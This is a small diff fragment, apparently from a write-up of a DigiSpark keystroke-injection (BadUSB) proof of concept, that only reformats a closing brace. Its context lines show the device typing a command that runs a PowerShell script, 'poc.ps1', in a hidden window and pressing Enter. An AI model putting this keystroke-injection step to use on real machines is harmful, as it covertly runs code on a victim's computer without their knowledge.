@@ -61,8 +61,7 @@ DigiKeyboard.print("powershell.exe -windowstyle hidden -file poc.ps1");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 for (;;) {
 /*empty*/
-}
-
+    }
 }
 ```
 
